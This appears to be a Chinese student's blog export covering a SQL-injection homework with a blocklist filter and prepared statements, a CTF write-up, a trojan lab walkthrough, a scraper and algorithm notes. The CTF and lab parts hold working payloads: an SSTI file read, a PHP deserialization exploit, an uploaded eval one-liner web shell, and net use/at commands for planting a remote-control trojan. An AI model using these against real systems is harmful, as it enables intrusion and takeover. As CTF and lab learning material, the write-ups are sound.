<span class="hljs-variable">$result</span> = <span class="hljs-variable">$mysqli</span>-&gt;query(<span class="hljs-string">&quot;select * from users where username=&#x27;<span class="hljs-subst">$uname</span>&#x27; and password=&#x27;<span class="hljs-subst">$pwd</span>&#x27;&quot;</span>);
<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;TABLE border=1,width=400&gt;&quot;</span>;
<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;tr&gt;&lt;th&gt;Name&lt;/th&gt;&lt;th&gt;Password&lt;/th&gt;&lt;tr&gt;&quot;</span>;

<span class="hljs-comment">// if(strlen($pwd)&gt;=16||strlen($uname)&gt;=15)</span>
<span class="hljs-comment">// &#123;</span>
<span class="hljs-comment">// 	echo &quot;It is too long.&quot;;</span>
<span class="hljs-comment">// &#125;</span>
<span class="hljs-comment">// else </span>
<span class="hljs-keyword">if</span>(<span class="hljs-variable">$row</span>=mysqli_fetch_row(<span class="hljs-variable">$result</span>))
&#123;
	printf (<span class="hljs-string">&quot;&lt;tr&gt;&lt;td&gt;%s&lt;/td&gt;&lt;td&gt;%s&lt;/td&gt;&lt;/tr&gt;&quot;</span>,<span class="hljs-variable">$row</span>[<span class="hljs-number">1</span>],<span class="hljs-variable">$row</span>[<span class="hljs-number">2</span>]);
       	<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;
	<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;login success.&quot;</span>;
&#125;
<span class="hljs-keyword">else</span>
&#123;
	<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;username or password error.&quot;</span>;
&#125;
<span class="hljs-comment">// echo &quot;&lt;/TABLE&gt;&quot;;</span>
<span class="hljs-comment">// echo &quot;&lt;/div&gt;&quot;;</span>
<span class="hljs-variable">$mysqli</span>-&gt;close();
<span class="hljs-variable">$result</span>-&gt;close();
<span class="hljs-meta">?&gt;</span></code></pre>

<p>过滤函数如下，其中将一般注入需要用到的函数和符号都过滤了。</p>
<pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">inject_check</span>(<span class="hljs-params"><span class="hljs-variable">$Sql_Str</span></span>) </span>&#123;<span class="hljs-comment">//自动过滤Sql的注入语句。</span>
    <span class="hljs-variable">$check</span>=preg_match(<span class="hljs-string">&#x27;/select|from|where|if|database|order|insert|update|or|group_concat|\&#x27;|\\*|\*|\.\.\/|\.\/|union|and|ascii|substring|sleep/i&#x27;</span>,<span class="hljs-variable">$Sql_Str</span>);
    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$check</span>) &#123;
        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;script language=&quot;JavaScript&quot;&gt;alert(&quot;hacker&quot;);&lt;/script&gt;&#x27;</span>;
        <span class="hljs-keyword">exit</span>();
    &#125;<span class="hljs-keyword">else</span>&#123;
        <span class="hljs-keyword">return</span> <span class="hljs-variable">$Sql_Str</span>;
    &#125;
&#125;</code></pre>



<h4 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a><strong>方法三</strong></h4><p>使用预编译语句</p>
<p>代码如下</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$pwd</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>];
<span class="hljs-variable">$uname</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];

<span class="hljs-comment">// function inject_check($Sql_Str) &#123;//自动过滤Sql的注入语句。</span>
<span class="hljs-comment">//     $check=preg_match(&#x27;/select|from|where|if|database|order|insert|update|or|group_concat|\&#x27;|\\*|\*|\.\.\/|\.\/|union|and|ascii|substring|sleep/i&#x27;,$Sql_Str);</span>
<span class="hljs-comment">//     if ($check) &#123;</span>
<span class="hljs-comment">//         echo &#x27;&lt;script language=&quot;JavaScript&quot;&gt;alert(&quot;hacker&quot;);&lt;/script&gt;&#x27;;</span>
<span class="hljs-comment">//         exit();</span>
<span class="hljs-comment">//     &#125;else&#123;</span>
<span class="hljs-comment">//         return $Sql_Str;</span>
<span class="hljs-comment">//     &#125;</span>
<span class="hljs-comment">// &#125;</span>
<span class="hljs-comment">// $pwd=inject_check($pwd);</span>
<span class="hljs-comment">// $uname = inject_check($uname);</span>
<span class="hljs-comment">// </span>

<span class="hljs-variable">$mysqli</span> = <span class="hljs-keyword">new</span> mysqli(<span class="hljs-string">&#x27;localhost&#x27;</span>,<span class="hljs-string">&#x27;root&#x27;</span>,<span class="hljs-string">&#x27;root&#x27;</span>,<span class="hljs-string">&#x27;test&#x27;</span>);  <span class="hljs-comment">// 数据库服务器的主机名这里使用的本地主机，密码，使用的数据库名</span>
<span class="hljs-keyword">if</span>(mysqli_connect_errno())&#123;
    printf(<span class="hljs-string">&quot;fail:%s&lt;br&gt;&quot;</span>,mysqli_connect_error());
    <span class="hljs-keyword">exit</span>();
&#125;

<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;TABLE border=1,width=400&gt;&quot;</span>;
<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;tr&gt;&lt;th&gt;Name&lt;/th&gt;&lt;th&gt;Password&lt;/th&gt;&lt;tr&gt;&quot;</span>;
<span class="hljs-variable">$result</span> =  <span class="hljs-variable">$mysqli</span>-&gt;prepare(<span class="hljs-string">&quot;select * from users where username=? and password=?&quot;</span>);

<span class="hljs-variable">$result</span>-&gt;bind_param(<span class="hljs-string">&#x27;ss&#x27;</span>,<span class="hljs-variable">$uname</span>,<span class="hljs-variable">$pwd</span>);
<span class="hljs-variable">$result</span>-&gt;execute();
<span class="hljs-variable">$result</span>-&gt;store_result();
<span class="hljs-variable">$result</span>-&gt;bind_result(<span class="hljs-variable">$id</span>,<span class="hljs-variable">$un</span>,<span class="hljs-variable">$pd</span>); <span class="hljs-comment">//将查询到的变量绑定到三个自定义的变量中，输出时直接输出这三个变量即可。</span>
<span class="hljs-keyword">if</span>(<span class="hljs-variable">$result</span>-&gt;fetch())
&#123;
	printf(<span class="hljs-string">&quot;&lt;tr&gt;&lt;td&gt;%s&lt;/td&gt;&lt;td&gt;%s&lt;/td&gt;&lt;/tr&gt;&quot;</span>,<span class="hljs-variable">$un</span>,<span class="hljs-variable">$pd</span>);
&#125;
<span class="hljs-keyword">else</span>
&#123;
	<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;username or password error.&quot;</span>;
&#125;



<span class="hljs-comment">// if(strlen($pwd)&gt;=16||strlen($uname)&gt;=15)</span>
<span class="hljs-comment">// &#123;</span>
<span class="hljs-comment">// 	echo &quot;It is too long.&quot;;</span>
<span class="hljs-comment">// &#125;</span>
<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/TABLE&gt;&quot;</span>;
<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/div&gt;&quot;</span>;
<span class="hljs-variable">$result</span>-&gt;close();
<span class="hljs-variable">$mysqli</span>-&gt;close();
<span class="hljs-meta">?&gt;</span></code></pre>

<p>应用预编译语句后，再次输入注入语句后就不再起到注入作用，只是将其当成正常的查询过程，返回相应的结果。</p>
]]></content>
      <categories>
        <category>网安作业</category>
      </categories>
      <tags>
        <tag>sql</tag>
        <tag>xss</tag>
      </tags>
  </entry>
  <entry>
    <title>cumt华为杯</title>
    <url>/2020/10/28/%E5%8D%8E%E4%B8%BA%E6%9D%AF/</url>
    <content><![CDATA[<h1 id="cumt-华为杯"><a href="#cumt-华为杯" class="headerlink" title="cumt_华为杯"></a>cumt_华为杯</h1><p>经典的学长虐菜局，web只做出来一个，另外两题好不容易有思路了，都被卡死了</p>
<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="doge"><a href="#doge" class="headerlink" title="doge"></a>doge</h3><p>真签到题，抽个奖就给出了flag</p>
<h3 id="babyflask"><a href="#babyflask" class="headerlink" title="babyflask"></a>babyflask</h3><p>刚进入页面，只有一张图片，查看源码也没发现什么</p>
<p>就是了模板注入</p>
<pre><code class="hljs handlebars"><span class="xml">url+</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">7</span>*<span class="hljs-number">7</span>&#125;&#125;</span><span class="xml">Copy</span></code></pre>

<p>页面出现404报错，并且显示的是url+49，确定是模板注入</p>
<pre><code class="hljs sqf">&#123;&#123;<span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__mro__</span>[<span class="hljs-number">2</span>].<span class="hljs-variable">__subclasses__</span>()&#125;&#125;
查看模块时，发现存在waf
经过测试发现是过滤了[]
于是使用
&#123;&#123;<span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__mro__</span>.<span class="hljs-variable">__getitem__</span>(<span class="hljs-number">2</span>).<span class="hljs-variable">__subclasses__</span>()&#125;&#125;
存在file模块
用read读取文件内容
<span class="hljs-built_in">exp</span>:
<span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__mro__</span>.<span class="hljs-variable">__getitem__</span>(<span class="hljs-number">2</span>).<span class="hljs-variable">__subclasses__</span>().pop(<span class="hljs-number">40</span>)(<span class="hljs-string">&#x27;/flag&#x27;</span>).read()Copy</code></pre>

<p>参考链接：<a href="https://xz.aliyun.com/t/8029">https://xz.aliyun.com/t/8029</a></p>
<h3 id="VulnCMS"><a href="#VulnCMS" class="headerlink" title="VulnCMS"></a>VulnCMS</h3><p>这题是真滴无语，开始以为是XSS，后来学长提示不是，又找到了文件上传的漏洞，直接拿到了网站根目录本以为做出了，结果提示flag not here,心态炸裂，但是提示了”投个稿？“，应该是在投稿位置下功夫吧。到最后也没做出了，但是找到了漏洞代码，应该是sql注入。</p>
<p><a href="https://i.loli.net/2020/10/25/usz3grOMb56lmPG.png"><img src="https://i.loli.net/2020/10/25/usz3grOMb56lmPG.png" alt="cms.png"></a></p>
<p>这里给出大神的做法</p>
<p><a href="https://i.loli.net/2020/10/25/mrLVelBfQdD28CA.png"><img src="https://i.loli.net/2020/10/25/mrLVelBfQdD28CA.png" alt="cms1.png"></a></p>
<h3 id="Hodor"><a href="#Hodor" class="headerlink" title="Hodor"></a>Hodor</h3><p>这题基本上是原题，但是加了一层过滤，怎么都没绕过去。。。</p>
<p>看到WP是大S绕过，涨知识了</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">Class</span> <span class="hljs-title">Source</span> </span>&#123;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>) </span>&#123;
        <span class="hljs-keyword">return</span> highlight_file(<span class="hljs-string">&#x27;license.txt&#x27;</span>, <span class="hljs-literal">true</span>).highlight_file(<span class="hljs-keyword">$this</span>-&gt;source, <span class="hljs-literal">true</span>);
    &#125;
&#125;
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">easy_check</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>) </span>&#123;
    <span class="hljs-comment">//echo $str;</span>
    <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$str</span>, <span class="hljs-variable">$matches</span>)) &#123;
        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
    &#125;
    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
&#125;
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;source&#x27;</span>]))&#123;
    <span class="hljs-variable">$s</span> = <span class="hljs-keyword">new</span> Source();
    <span class="hljs-variable">$s</span>-&gt;source = <span class="hljs-keyword">__FILE__</span>;

    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$s</span>;
    <span class="hljs-keyword">exit</span>;
&#125;
<span class="hljs-variable">$todos</span> = [];
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;todos&#x27;</span>]))&#123;
    <span class="hljs-keyword">if</span>(!easy_check(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;todos&#x27;</span>])) &#123;
        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hacker!\n&quot;</span>;
    &#125; <span class="hljs-keyword">else</span> &#123;
        <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;todos&#x27;</span>];
        <span class="hljs-variable">$h</span> = substr(<span class="hljs-variable">$c</span>, <span class="hljs-number">0</span>, <span class="hljs-number">32</span>);
        <span class="hljs-variable">$m</span> = substr(<span class="hljs-variable">$c</span>, <span class="hljs-number">32</span>);
        <span class="hljs-keyword">if</span>(md5(<span class="hljs-variable">$m</span>) === <span class="hljs-variable">$h</span>)&#123;
            <span class="hljs-variable">$todos</span> = unserialize(<span class="hljs-variable">$m</span>);
        &#125;
    &#125;
&#125;
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;text&#x27;</span>]))&#123;
    <span class="hljs-variable">$todo</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;text&#x27;</span>];

    <span class="hljs-variable">$todos</span>[] = <span class="hljs-variable">$todo</span>;
    <span class="hljs-variable">$m</span> = serialize(<span class="hljs-variable">$todos</span>);
    <span class="hljs-variable">$h</span> = md5(<span class="hljs-variable">$m</span>);

    setcookie(<span class="hljs-string">&#x27;todos&#x27;</span>, <span class="hljs-variable">$h</span>.<span class="hljs-variable">$m</span>);
    header(<span class="hljs-string">&#x27;Location: &#x27;</span>.<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>]);
    <span class="hljs-keyword">exit</span>;
&#125;
<span class="hljs-comment">// flag is in flag.php</span>
?Copy</code></pre>

<p>exp</p>
<pre><code class="hljs rust">echo md5(<span class="hljs-symbol">&#x27;a</span>:<span class="hljs-number">2</span>:&#123;i:<span class="hljs-number">0</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;123&quot;</span>;i:<span class="hljs-number">1</span>;O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;Source&quot;</span>:<span class="hljs-number">1</span>:
&#123;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;source&quot;</span>;S:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;\66lag.php&quot;</span>;&#125;&#125;&#x27;);
echo urlencode(<span class="hljs-symbol">&#x27;ae5860e508aaf353a9ad78ac246f46fba</span>:<span class="hljs-number">2</span>:
&#123;i:<span class="hljs-number">0</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;123&quot;</span>;i:<span class="hljs-number">1</span>;O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;Source&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;source&quot;</span>;S:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;\66lag.php&quot;</span>;&#125;&#125;&#x27;);<span class="hljs-built_in">Copy</span></code></pre>

<p><a href="https://i.loli.net/2020/10/25/hNxGEfI5lRaevUg.png"><img src="https://i.loli.net/2020/10/25/hNxGEfI5lRaevUg.png" alt="hodor.png"></a></p>
<p>参考</p>
<p><a href="https://blog.csdn.net/SmileAndFun/article/details/108497183">https://blog.csdn.net/SmileAndFun/article/details/108497183</a></p>
<h3 id="webcms"><a href="#webcms" class="headerlink" title="webcms"></a>webcms</h3><p>是一个博客管理的网站，其实也是个原题，考察点是文件上传</p>
<p>漏洞点在图片中上传图片的位置</p>
<p><a href="https://i.loli.net/2020/10/25/qAB4ZnH23j98JaO.png"><img src="https://i.loli.net/2020/10/25/qAB4ZnH23j98JaO.png" alt="webcms.png"></a></p>
<p>随便上传一张图片试试，抓包结果如下，几个注意点</p>
<p><a href="https://i.loli.net/2020/10/25/71cSPbv6KuaUl35.png"><img src="https://i.loli.net/2020/10/25/71cSPbv6KuaUl35.png" alt="webcms2.png"></a></p>
<blockquote>
<p>1.filetype规定了文件的类型</p>
<p>2.上传时，将图片保存为了base64形式</p>
<p>所以上传一句话木马的时候要注意修改对应的位置</p>
</blockquote>
<p>一句话木马类型为php,则filetype改为php</p>
<p>内容为密码为cmd一句话木马，对应的base64编码<code>PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs/Pg==</code></p>
<p><a href="https://i.loli.net/2020/10/25/YdaDjZmzb8KX6rc.png"><img src="https://i.loli.net/2020/10/25/YdaDjZmzb8KX6rc.png" alt="webcms3.png"></a></p>
<p>上传成功，访问保存的路径：<code>http://219.219.61.234:20203/upload/tmp/1_Y2R8AK57UWV4JBW.php</code></p>
<pre><code class="hljs css">POST:
cmd=<span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;cat /flag&quot;</span>);
或者蚁剑连接，密码cmdCopy</code></pre>

<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><p>MIsc部分基本都是队友做的，好像也不是太难</p>
<h3 id="伪web"><a href="#伪web" class="headerlink" title="伪web"></a>伪web</h3><p>真是伪web。。。</p>
<p>直接在文件里搜索就能到flag</p>
<p>搜索关键词cmut，flag所在文件夹为html\include\include.php</p>
]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>unserialize</tag>
        <tag>ssti</tag>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title>木马</title>
    <url>/2020/07/18/%E6%9C%A8%E9%A9%AC/</url>
    <content><![CDATA[<h1 id="初识木马"><a href="#初识木马" class="headerlink" title="初识木马"></a>初识木马</h1><span id="more"></span>
<h2 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h2><p><strong>使用灰鸽子软件以及端口爆破软件控制目的主机</strong></p>
<p>准备一台xp，一台2003<br>其中xp地址为10.1.1.3/24 2003为10.1.1.1/24<br>使两个主机能够通信<br>xp作为攻击方，2003为受害者</p>
<h3 id="1-制作木马"><a href="#1-制作木马" class="headerlink" title="1.制作木马"></a>1.制作木马</h3><p>使用灰鸽子制作木马，将木马生成在在桌面（记住路径之后要使用）<br><img src="https://i.loli.net/2020/11/30/xci7NTtIXgeODkz.png" alt><br><img src="https://i.loli.net/2020/11/30/H38gByNiumIE1t7.png" alt></p>
<h3 id="2-扫描主机，并对账号密码进行爆破"><a href="#2-扫描主机，并对账号密码进行爆破" class="headerlink" title="2.扫描主机，并对账号密码进行爆破"></a>2.扫描主机，并对账号密码进行爆破</h3><p>ip起始地址为10.1.1.1-10.1.1.255<br>密码配置文件<br><img src="https://i.loli.net/2020/11/30/8gSyYGJxjvqTaDR.png" alt><br>其实只要扫描10.1.1.1即可（因为是实验）</p>
<p>获取账号密码<br>username：administrator<br>password: “”</p>
<h3 id="3-与目标主机建立IPC"><a href="#3-与目标主机建立IPC" class="headerlink" title="3.与目标主机建立IPC$"></a>3.与目标主机建立IPC$</h3><p><code>net use \\10.1.1.1\ipc$ &quot;&quot; \user:administrator</code></p>
<h3 id="4-植入木马到目标主机"><a href="#4-植入木马到目标主机" class="headerlink" title="4.植入木马到目标主机"></a>4.植入木马到目标主机</h3><p><code>copy C:\Documents and Settings\shimisi\桌面\qq.exe  \\10.1.1.1\ipc$</code></p>
<h3 id="5-设置目标主机运行木马"><a href="#5-设置目标主机运行木马" class="headerlink" title="5.设置目标主机运行木马"></a>5.设置目标主机运行木马</h3><p><code>net time \\10.1.1.1</code>根据目标主机时间设置事物的开始时间<br><code>at \\10.1.1.1 17:17 c:\qq.exe</code>在上面的时间之后三分钟左右设置一个事物<br>即在17：17时运行木马文件</p>
<h3 id="6-成功控制目标主机"><a href="#6-成功控制目标主机" class="headerlink" title="6.成功控制目标主机"></a>6.成功控制目标主机</h3><p>观察目标主机已自动上线，已可以进行监控或传输数据等操作</p>
<p>获取屏幕内容<br><img src="https://i.loli.net/2020/11/30/1Mow9ZpJxznAFRS.png" alt></p>
<p>控制命令行<br><img src="https://i.loli.net/2020/11/30/nKMgSveqLyYr4aJ.png" alt></p>
]]></content>
      <categories>
        <category>木马</category>
      </categories>
  </entry>
  <entry>
    <title>爬图</title>
    <url>/2020/07/18/%E7%88%AC%E5%9B%BE/</url>
    <content><![CDATA[<h1 id="用爬虫爬取小姐姐的图片"><a href="#用爬虫爬取小姐姐的图片" class="headerlink" title="用爬虫爬取小姐姐的图片"></a>用爬虫爬取小姐姐的图片</h1><span id="more"></span>
<p><strong>用的库</strong></p>
<pre><code class="hljs applescript">re <span class="hljs-comment">#正则表达式</span>
requests <span class="hljs-comment">#url请求</span>
<span class="hljs-built_in">time</span>   <span class="hljs-comment">#时间</span>
os     <span class="hljs-comment">#用于创建文件夹，保存图片</span></code></pre>
<p>##准备工作<br>1.首先访问该链接<br><code>https://www.vmgirls.com/</code><br>2.随便点击一个进入查看详情<br><code>https://www.vmgirls.com/13344.html</code><br>3.F12审查元素网查看页详情，主要查看图片链接的标签位置，写出正则表达式<br><img src="https://i.loli.net/2020/12/04/49X1BbloChqFsic.png" alt="1"><br>该正则表达式为<code>findlinks = &#39;&lt;a href=&quot;(.*?)&quot; alt=&quot;.*?&quot; title=&quot;.*?&quot;&gt;&#39;</code></p>
<h2 id="完整程序"><a href="#完整程序" class="headerlink" title="完整程序"></a>完整程序</h2><pre><code class="hljs python"><span class="hljs-comment"># -*- coding = utf - 8 -*-</span>
<span class="hljs-comment">#@Time : 2020/7/16 13:36</span>
<span class="hljs-comment">#@Author : sunzy</span>
<span class="hljs-comment">#@File : tupian.py</span>
<span class="hljs-keyword">import</span> re
<span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> time
<span class="hljs-keyword">import</span> os

<span class="hljs-built_in">dir</span> = <span class="hljs-string">&quot;plmm&quot;</span>        <span class="hljs-comment">#文件夹名字</span>
<span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(<span class="hljs-built_in">dir</span>):   <span class="hljs-comment">#首先判断是否存在当前文件夹如果没有则创建一个</span>
    os.mkdir(<span class="hljs-built_in">dir</span>)
<span class="hljs-comment"># 模仿浏览器的首部信息，绕过一些网站的反爬取措施</span>
head = &#123;
        <span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36 Edg/83.0.478.61&quot;</span>
    &#125;

url = <span class="hljs-string">&quot;https://www.vmgirls.com/13344.html&quot;</span>
response = requests.get(url, headers = head)   <span class="hljs-comment"># 访问目标网页，获取网页内容</span>
html = response.text

findlinks = <span class="hljs-string">&#x27;&lt;a href=&quot;(.*?)&quot; alt=&quot;.*?&quot; title=&quot;.*?&quot;&gt;&#x27;</span>
urls = re.findall(findlinks, html)   <span class="hljs-comment">#爬取到的图片链接保存在urls中， 是一个列表</span>

<span class="hljs-keyword">for</span> url <span class="hljs-keyword">in</span> urls:
    time.sleep(<span class="hljs-number">1</span>)    <span class="hljs-comment">#防止访问速度过快使服务器崩溃</span>
    file_name = url.split(<span class="hljs-string">&#x27;/&#x27;</span>)[-<span class="hljs-number">1</span>]    <span class="hljs-comment">#保存图片的名字</span>

    res = requests.get(url, headers = head)   <span class="hljs-comment">#依此访问图片链接</span>
    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-built_in">dir</span>+<span class="hljs-string">&#x27;/&#x27;</span>+file_name, <span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> f:   <span class="hljs-comment">#以二进制形式保存图片</span>
        f.write(res.content)</code></pre>

]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title>算法上机复习</title>
    <url>/2020/11/04/%E7%AE%97%E6%B3%95%E4%B8%8A%E6%9C%BA%E5%A4%8D%E4%B9%A0/</url>
    <content><![CDATA[<p>最近算法实验要上机考试，所以还是准备一下吧(还不是因为自己太菜了)</p>
<span id="more"></span>

<h1 id="16级题目"><a href="#16级题目" class="headerlink" title="16级题目"></a>16级题目</h1><h2 id="问题-A-星空梦想——鲁班"><a href="#问题-A-星空梦想——鲁班" class="headerlink" title="问题 A: 星空梦想——鲁班"></a>问题 A: 星空梦想——鲁班</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p>鲁班七号是王者峡谷里的射手，站撸英雄。战场上的鲁班七号，机制强大的鲨嘴炮，立刻将挡在前路的任何物体轰飞。正如他所说的，“借你们的肉体试验下新发明的威力”。是的，这就是鲁班大师和他的天才机关造物鲁班七号。然而，鲁班最为致命的缺点是腿短，跑得慢，一个稍不留神，便会被刺客所击杀。</p>
<p>既然腿短，那么就来多多运动吧，跳跳台阶可还行？假设鲁班七号一次可以跳上1级台阶，但极限一次只能跳上2级台阶（腿短没办法，嘤嘤嘤）。鲁班七号现在从0级阶梯开始，最终跳上第n级的台阶，求总共有多少种跳法？</p>
<h3 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h3><p>多组测试用例。</p>
<p>第一行输入包含一个整数T（1&lt;=T&lt;=50），代表测试用例个数。</p>
<p>接下来T行，每行输入包含一个整数n（1&lt;=n&lt;=50），代表鲁班最终跳上了第n级台阶。</p>
<h3 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h3><p>每组测试用例对应一行输出，每行输出一个整数ans，代表鲁班最终跳上第n级台阶的跳法种数。</p>
<h3 id="样例输入"><a href="#样例输入" class="headerlink" title="样例输入"></a>样例输入</h3><pre><code class="hljs plain">3
3
4
50</code></pre>

<h3 id="样例输出"><a href="#样例输出" class="headerlink" title="样例输出"></a>样例输出</h3><pre><code class="hljs dns"><span class="hljs-number">3</span>
<span class="hljs-number">5</span>
<span class="hljs-number">20365011074</span></code></pre>

<h3 id="提示"><a href="#提示" class="headerlink" title="提示"></a>提示</h3><p>注意结果超过int范围，请用long long类型存储ans</p>
<pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;bits/stdc++.h&gt;</span></span>
<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;
<span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> N=<span class="hljs-number">50</span>;
<span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> f[N];
<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>
<span class="hljs-function"></span>&#123;
	f[<span class="hljs-number">0</span>]=<span class="hljs-number">1</span>,f[<span class="hljs-number">1</span>]=<span class="hljs-number">1</span>;
	<span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">2</span>;i&lt;=<span class="hljs-number">50</span>;i++)
	&#123;
		f[i]=f[i<span class="hljs-number">-1</span>]+f[i<span class="hljs-number">-2</span>];
	&#125;
	<span class="hljs-keyword">int</span> n;
	<span class="hljs-built_in">cin</span>&gt;&gt;n;
	<span class="hljs-keyword">while</span>(n--)
	&#123;
		<span class="hljs-keyword">int</span> m;
		<span class="hljs-built_in">cin</span>&gt;&gt;m;
		<span class="hljs-built_in">cout</span>&lt;&lt;f[m]&lt;&lt;<span class="hljs-built_in">endl</span>;
	&#125;
	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
 &#125; 
</code></pre>



<h2 id="问题-B-午夜歌剧——元歌"><a href="#问题-B-午夜歌剧——元歌" class="headerlink" title="问题 B: 午夜歌剧——元歌"></a>问题 B: 午夜歌剧——元歌</h2><h3 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h3><p>元歌是王者峡谷里的刺客。何谓至高机关之美呢？唯有以至高权力的手令太古奇迹重现人世，方能称得上啊。</p>
<p>是的，元歌擅长操控，所做傀儡能起到以假乱真的作用，今天元歌的傀儡变成你的初中数学老师，给你出个数学题：给你一个数字x，让你求出k7、k6、k5、k4、k3、k2、k1、k0（0&lt;=ki&lt;=9），使得以下等式1成立，最后根据等式2求出最终ans值。</p>
<p>等式1：</p>
<p><img src="https://s1.ax1x.com/2018/11/07/iTxDvF.png" alt="img"></p>
<p>等式2：</p>
<p><img src="https://s1.ax1x.com/2018/11/07/iTxsu4.png" alt="img"></p>
<h3 id="输入-1"><a href="#输入-1" class="headerlink" title="输入"></a>输入</h3><p>多组测试用例。</p>
<p>第一行输入包含一个整数T（1&lt;=T&lt;=1000），代表测试用例个数。</p>
<p>接下来T行，每一行包含一个整数x（1&lt;=x&lt;=1500000）。</p>
<h3 id="输出-1"><a href="#输出-1" class="headerlink" title="输出"></a>输出</h3><p>每组测试用例对应一行输出，每行输出一个整数ans，代表最终运算结果。</p>
<h3 id="样例输入-1"><a href="#样例输入-1" class="headerlink" title="样例输入"></a>样例输入</h3><pre><code class="hljs dns"><span class="hljs-number">3</span>
<span class="hljs-number">7</span>
<span class="hljs-number">143</span>
<span class="hljs-number">3223193224</span></code></pre>

<h3 id="样例输出-1"><a href="#样例输出-1" class="headerlink" title="样例输出"></a>样例输出</h3><pre><code class="hljs dns"><span class="hljs-number">10</span>
<span class="hljs-number">151</span>
<span class="hljs-number">163311433223</span></code></pre>

<h3 id="提示-1"><a href="#提示-1" class="headerlink" title="提示"></a>提示</h3><p>测试数据均大于等于1，不用特判0</p>
<p>感觉图片等式有点问题，一开始没理解什么意思，后来看了学长的提示。本质就是进制转换。</p>
